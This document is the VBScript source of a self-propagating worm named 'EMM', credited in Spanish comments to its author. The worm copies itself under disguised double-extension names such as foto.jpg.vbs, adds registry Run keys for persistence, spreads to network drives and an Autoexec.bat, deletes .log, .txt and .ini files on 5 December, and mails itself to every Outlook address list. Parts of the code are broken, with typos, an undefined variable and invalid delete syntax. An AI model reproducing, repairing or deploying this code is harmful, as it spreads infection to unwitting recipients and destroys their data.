   ' El worm fue creado por PetiK
   ' El worm se llama: EMM
   On Error Resume Next
   set fso = createobject("scripting.filesystemobject")
   Set s = CreateObject("Scripting.FileSystemObject")
   Set v = CreateObject("Wscript.Shell")
   set ws = createobject("scriting.filesystemobject")
   s.copyfile wscript.scriptfullname, "c:\EMM.vbs"
   s.copyfile wscript.scriptfullname, "c:\je.vbs"
   set ws = createobject("wscript.shell")
   ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", "c:\EMM.vbs"
   s.copyfile "wscript.scriptfullname", "a:\Important.txt.vbs"
   s.copyfile "wscript.scriptfullname", "a:\Juegos.zip.vbs"
   s.copyfile "wscript.scriptfullname", "a:\ReadMe.txt.vbs"
   s.copyfile "wscript.scriptfullname", "a:\foto.jpg.vbs"
   s.copyfile "wscript.scriptfullname", "a:\Galeria de Fotos.vbs"
   s.copyfile "wscript.scriptfullname", "a:\ventas.doc.vbs"
   Set wsn = CreateObject("Wscript.NetWork")
   Set enm = wsn.EnumNetworkDrives
   For net = 0 To enm.Count - 1
   If InStr(enm.Item(net), "\\") = 1 Then
   fso.CopyFile file1, enm.Item(net) & "\setup.vbs
   Set creads = fso.CreateTextFile(enm.Item(net), "\Autoexec.bat")
   creads.writeline "Start C:\EMM.vbs"
   creads.Close
   End If
   Next
   ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\EMM", "c:\virii.vbs"

   If day(now()) = 5And Month(now()) = 12Then
   deletefile C:\Windows\*.log
   deletefile C:\*.txt
   deletefile C:\Windows\*.ini
   deletefile C:\Windows\*.log









   Set Outlooc = CreateObject("Outlook.Application")
   If Outlooc = "Outlook" Then
   Set Ma = Outlooc.GetNameSpace("Mapi")
   For LB = 1 To Ma.AddressLists.Count
   Set msg = Outlooc.CreateItem(0)
   Set LB2 = Ma.AddressLists.Item(LB)
   msg.Body = "Here it is for you !"
   msg.Subject = "RE: Important !!"
   msg.Attachment = "c:\EMM.vbs"
   Set Dirc = LB2.AddressEntries
   Set DTS = msg.Recipients
   For az = 1 To Dirc.Count
   msg.Recipients.Add Dirc.Item(az)
   Next
   msg.Send
   Next
   End If
